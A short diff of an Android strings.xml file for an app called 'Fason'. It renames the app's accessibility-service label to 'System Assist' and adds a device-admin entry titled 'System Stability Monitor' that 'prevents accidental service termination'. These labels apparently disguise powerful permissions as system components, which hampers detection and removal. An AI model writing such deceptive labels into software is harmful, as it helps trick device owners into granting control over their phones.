@@ -1,8 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
 <resources>
-
-    <string name="app_name">Fason0000000000000000000000000000000000000000000</string>
-
-    <string name="accessibility_service_label">Fason</string>
-
+    <string name="app_name">Fason</string>
+    <string name="accessibility_service_label">System Assist</string>
     <string name="accessibility_service_description">Required for remote device management features</string>
+    <string name="device_admin_label">System Stability Monitor</string>
+    <string name="device_admin_description">Monitors system stability and prevents accidental service termination.</string>
 </resources>
